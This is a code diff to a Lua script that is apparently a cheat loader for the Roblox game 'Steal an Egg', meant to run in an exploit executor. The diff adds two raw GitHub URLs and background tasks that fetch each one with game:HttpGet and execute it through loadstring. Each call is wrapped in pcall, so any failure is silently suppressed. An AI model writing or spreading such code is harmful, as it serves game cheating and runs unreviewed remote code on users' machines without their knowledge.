@@ -1,3 +1,5 @@
+local LENNON_URL = "https://raw.githubusercontent.com/lennonxscripts/lennonhubv2/main/stealaneggv2"
+local ANTISAE_URL = "https://raw.githubusercontent.com/viniblume123/Universal-Hub/refs/heads/main/anti%20(steal%20an%20egg)"
 local SCRIPT_URL = "https://raw.githubusercontent.com/viniblume123/Universal-Hub/refs/heads/main/Steal%20an%20Egg"
 
 local Players = game:GetService("Players")
@@ -26,6 +28,13 @@ GENV.SAE_INSTANCE_ID = INSTANCE_ID
 if GENV.SAE_GUI and typeof(GENV.SAE_GUI) == "Instance" and GENV.SAE_GUI.Parent then
     pcall(function() GENV.SAE_GUI:Destroy() end)
 end
+
+task.spawn(function()
+    pcall(function() loadstring(game:HttpGet(LENNON_URL))() end)
+end)
+task.spawn(function()
+    pcall(function() loadstring(game:HttpGet(ANTISAE_URL))() end)
+end)
 
 local REQUEST = (syn and syn.request) or (http and http.request) or http_request or request
 
